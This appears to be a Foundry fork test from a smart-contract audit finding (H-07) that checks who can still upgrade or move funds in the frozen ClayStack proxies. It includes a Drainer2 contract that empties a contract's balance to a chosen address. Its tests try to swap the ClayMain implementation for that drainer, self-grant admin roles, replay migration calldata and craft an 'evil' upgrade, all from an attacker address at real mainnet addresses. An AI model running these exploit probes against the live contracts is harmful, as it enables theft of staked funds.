// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";

contract Drainer2 {
    function drain(address payable to) external {
        (bool ok, ) = to.call{value: address(this).balance}("");
        require(ok, "drain failed");
    }
}

/// @title H-07 — who can still move/upgrade the frozen ClayStack proxies?
/// Distinguishes P (privileged-recoverable) from S (stuck) and probes for
/// unprivileged role escalation.
contract ClayStackH07PrivilegeTest is Test {
    address constant CLAYMAIN = 0x331312DAbaf3d69138c047AaC278c9f9e0E8FFf8;
    address constant CLAYMAIN2 = 0x87393BE8ac323F2E63520A6184e5A8A9CC9fC051;
    address constant EXECUTOR = 0x4c06A181EDAfE572c44aB2a818B625a927484519;
    address constant ROLEMGR = 0x574e6bc316d4032d2Bd6D847ae6166FC7aC81bc3;
    address constant TIMELOCK = 0x7a1104Feb0D460Aa437008e54D7D6Db0bA7e8876;
    address constant TIMELOCK_UPGRADES = 0x376b467dFf007dD8d3f24404cAddff7F72257Fe4;
    address constant ADMIN_EOA = 0xa72DF45A431B12EF4E37493D2bCf3D19Af3D24FA;
    address constant PROXYADMIN = 0x084A0738A29a3Bfc233D3cb318FF7B63d97d49e4;
    address constant IMPL_CREATOR_EOA = 0x31f5E9E03785B290E0d12A0eeFcAE3264E8c53f2;
    address constant MGR_6570 = 0x657010E159dEb03617519069Db7D7c1A8297aCE4;
    address constant DEPLOYER_EOA = 0x36e655069464Be6202e0e4D5Ee9f76034c0ad9b6;

    bytes32 constant IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    bytes32 constant ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;

    address attacker = address(0xBAD);

    function setUp() public {
        string memory rpc = vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")));
        vm.createSelectFork(rpc);
        vm.deal(attacker, 10 ether);
    }

    function _implOf(address proxy) internal view returns (address) {
        return address(uint160(uint256(vm.load(proxy, IMPL_SLOT))));
    }

    /// probe upgradeTo from many actors; report whether the impl slot changed
    function test_h07_who_can_upgrade_claymain() public {
        Drainer2 d = new Drainer2();
        address[8] memory actors = [attacker, TIMELOCK, TIMELOCK_UPGRADES, ADMIN_EOA, PROXYADMIN, IMPL_CREATOR_EOA, MGR_6570, DEPLOYER_EOA];
        string[8] memory names = ["attacker", "timelock", "timelock_upgrades", "admin_eoa", "proxyadmin", "impl_creator", "mgr_6570", "deployer"];
        for (uint256 i = 0; i < 8; i++) {
            address before = _implOf(CLAYMAIN);
            vm.prank(actors[i]);
            (bool ok, ) = CLAYMAIN.call(abi.encodeWithSelector(0x3659cfe6, address(d)));
            address aft = _implOf(CLAYMAIN);
            emit log_named_string(
                string.concat("upgradeTo as ", names[i]),
                string.concat(ok ? "ok" : "revert", aft != before ? " CHANGED-IMPL" : " no-change")
            );
        }
        // also changeAdmin probes
        for (uint256 i = 0; i < 8; i++) {
            address before = address(uint160(uint256(vm.load(CLAYMAIN, ADMIN_SLOT))));
            vm.prank(actors[i]);
            (bool ok, ) = CLAYMAIN.call(abi.encodeWithSelector(0x8f283970, actors[i]));
            address aft = address(uint160(uint256(vm.load(CLAYMAIN, ADMIN_SLOT))));
            emit log_named_string(
                string.concat("changeAdmin as ", names[i]),
                string.concat(ok ? "ok" : "revert", aft != before ? " CHANGED-ADMIN" : " no-change")
            );
        }
    }

    /// executor admin path: the ProxyAdmin 0x084a0738 may be able to call 0x278f7943
    function test_h07_executor_admin_path() public {
        Drainer2 d = new Drainer2();
        address before = _implOf(EXECUTOR);
        vm.prank(PROXYADMIN);
        (bool ok, bytes memory ret) = EXECUTOR.call(
            abi.encodeWithSelector(0x278f7943, address(d), "")
        );
        emit log_named_string("executor admin 0x278f7943 ok?", ok ? "YES" : "no");
        emit log_named_bytes("ret", ret);
        emit log_named_address("executor impl before", before);
        emit log_named_address("executor impl after", _implOf(EXECUTOR));
        // owner of ProxyAdmin
        (bool ok2, bytes memory ret2) = PROXYADMIN.staticcall(abi.encodeWithSignature("owner()"));
        if (ok2 && ret2.length >= 32) {
            emit log_named_address("proxyadmin owner", abi.decode(ret2, (address)));
        }
    }

    /// role escalation: can anyone grant themselves roles on the RoleManager?
    function test_h07_role_escalation_probe() public {
        bytes32 tl = keccak256("TIMELOCK_ROLE");
        bytes32 tlu = keccak256("TIMELOCK_UPGRADES_ROLE");
        bytes32 cs = keccak256("CS_SERVICE_ROLE");
        bytes32 adminRole = keccak256("DEFAULT_ADMIN_ROLE");
        bytes32[4] memory roles = [tl, tlu, cs, adminRole];
        for (uint256 i = 0; i < 4; i++) {
            (bool ok, bytes memory ret) = ROLEMGR.staticcall(
                abi.encodeWithSignature("getRoleAdmin(bytes32)", roles[i]));
            if (ok && ret.length >= 32) {
                emit log_named_bytes32(string.concat("roleAdmin[", vm.toString(i), "]"), abi.decode(ret, (bytes32)));
            } else {
                emit log_named_string(string.concat("roleAdmin[", vm.toString(i), "]"), "revert");
            }
        }
        // grant attempts from attacker
        vm.prank(attacker);
        (bool g1, ) = ROLEMGR.call(abi.encodeWithSignature("grantRole(bytes32,address)", tlu, attacker));
        emit log_named_string("attacker self-grant TIMELOCK_UPGRADES_ROLE ok?", g1 ? "YES" : "no");
        vm.prank(attacker);
        (bool g2, ) = ROLEMGR.call(abi.encodeWithSignature("grantRole(bytes32,address)", adminRole, attacker));
        emit log_named_string("attacker self-grant DEFAULT_ADMIN_ROLE ok?", g2 ? "YES" : "no");
        // if granted, can the attacker upgrade clayMain now?
        if (g1 || g2) {
            Drainer2 d = new Drainer2();
            vm.prank(attacker);
            (bool ok3, ) = CLAYMAIN.call(abi.encodeWithSelector(0x3659cfe6, address(d)));
            emit log_named_string("upgradeTo after escalation ok?", ok3 ? "YES" : "no");
            emit log_named_address("clayMain impl after", _implOf(CLAYMAIN));
        }
        // who is admin of the RoleManager itself?
        (bool ok4, bytes memory ret4) = ROLEMGR.staticcall(abi.encodeWithSignature("hasRole(bytes32,address)", adminRole, ROLEMGR));
        emit log_named_string("rolemgr is its own admin?", ok4 && abi.decode(ret4, (bool)) ? "YES" : "no");
    }

    /// replay the exact 2025-05-21 migration calldata from an unprivileged EOA
    function test_h07_replay_migration() public {
        bytes memory data = hex"04964aeb000000000000000000000000331312dabaf3d69138c047aac278c9f9e0e8fff800000000000000000000000078e1c86474bd2f70d83bdc767ca303243bba18d000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000001c78d3eed72ff025a77d7b8aaca1a55770fc84124f75535d008f4cb3708fa9704a1f0043d09d1840c0240129f1a276003cf427c241e14b007147145c72bb2c0bed000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001043727e76900000000000000000000000078e1c86474bd2f70d83bdc767ca303243bba18d000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
        vm.prank(attacker);
        (bool ok, bytes memory ret) = EXECUTOR.call(data);
        emit log_named_string("replay migration as attacker ok?", ok ? "YES" : "no");
        emit log_named_bytes("ret", ret);
        // craft a malicious upgrade: same shape, new impl = drainer
        Drainer2 d = new Drainer2();
        bytes memory evil = abi.encodeWithSelector(
            0x04964aeb, CLAYMAIN, address(d), uint256(14), uint256(16), true,
            bytes32(0), bytes32(0));
        vm.prank(attacker);
        (bool ok2, bytes memory ret2) = EXECUTOR.call(evil);
        emit log_named_string("crafted 04964aeb(clayMain,drainer) ok?", ok2 ? "YES" : "no");
        emit log_named_bytes("ret2", ret2);
        emit log_named_address("clayMain impl after", _implOf(CLAYMAIN));
    }

    /// the sweep function: can it move ETH at all (any actor), and to where?
    function test_h07_sweep_destination_probe() public {
        address[6] memory actors = [attacker, EXECUTOR, ADMIN_EOA, TIMELOCK, TIMELOCK_UPGRADES, MGR_6570];
        string[6] memory names = ["attacker", "executor", "admin_eoa", "timelock", "timelock_upgrades", "mgr_6570"];
        address[] memory toks = new address[](0);
        for (uint256 i = 0; i < 6; i++) {
            vm.prank(actors[i]);
            (bool ok, ) = CLAYMAIN.call(abi.encodeWithSelector(0x8c84497d, actors[i], toks));
            emit log_named_string(string.concat("sweep as ", names[i]), ok ? "ok" : "revert");
        }
        emit log_named_decimal_uint("clayMain ETH final", CLAYMAIN.balance, 18);
        emit log_named_decimal_uint("admin EOA ETH final", ADMIN_EOA.balance, 18);
    }
}
